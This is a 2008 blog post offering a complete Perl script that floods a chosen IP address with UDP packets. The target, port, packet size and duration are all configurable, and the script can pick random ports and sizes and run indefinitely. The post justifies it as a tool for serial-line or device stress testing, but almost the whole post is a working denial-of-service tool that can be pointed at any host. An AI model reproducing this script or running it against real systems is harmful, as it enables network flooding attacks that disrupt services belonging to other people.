---
title: "UDP flood in Perl"
date: "2008-03-22T07:57:00.002+01:00"
tags: [ labs ]
---

<iframe src="http://rcm-na.amazon-adsystem.com/e/cm?t=cisioshinandt-20&o=1&p=6&l=st1&mode=books&search=Perl&fc1=000000&lt1=_blank&lc1=3366FF&bg1=FFFFFF&f=ifr" marginwidth="0" marginheight="0" width="120" height="150" border="0" frameborder="0" style="border:none; float:right;" scrolling="no"></iframe>If you'll ever find yourself in a situation where you'll need UDP flooding (serial line or device stress testing) but won't have a dedicated flood program available (they're usually just a few click away if you consult uncle Google), here's a Perl version of UDP flood:<pre class='code'>#!/usr/bin/perl<br />##############<br /><br /># udp flood.<br />##############<br />&nbsp;<br />use Socket;<br />use strict;<br />&nbsp;<br />if ($#ARGV != 3) {<br />&nbsp;&nbsp;print "flood.pl &lt;ip&gt; &lt;port&gt; &lt;size&gt; &lt;time&gt;\n\n";<br />&nbsp;&nbsp;print " port=0: use random ports\n";<br />&nbsp;&nbsp;print " size=0: use random size between 64 and 1024\n";<br />&nbsp;&nbsp;print " time=0: continuous flood\n";<br />&nbsp;&nbsp;exit(1);<br />}<br />&nbsp;<br />my ($ip,$port,$size,$time) = @ARGV;<br />&nbsp;<br />my ($iaddr,$endtime,$psize,$pport);<br />&nbsp;<br />$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";<br />$endtime = time() + ($time ? $time : 1000000);<br />&nbsp;<br />socket(flood, PF_INET, SOCK_DGRAM, 17);<br /><br />&nbsp;<br />print "Flooding $ip " . ($port ? $port : "random") . " port with " . <br />&nbsp;&nbsp;($size ? "$size-byte" : "random size") . " packets" . <br />&nbsp;&nbsp;($time ? " for $time seconds" : "") . "\n";<br />print "Break with Ctrl-C\n" unless $time;<br />&nbsp;<br />for (;time() &lt;= $endtime;) {<br />&nbsp;&nbsp;$psize = $size ? $size : int(rand(1024-64)+64) ;<br />&nbsp;&nbsp;$pport = $port ? $port : int(rand(65500))+1;<br />&nbsp;<br />&nbsp;&nbsp;send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}</pre>

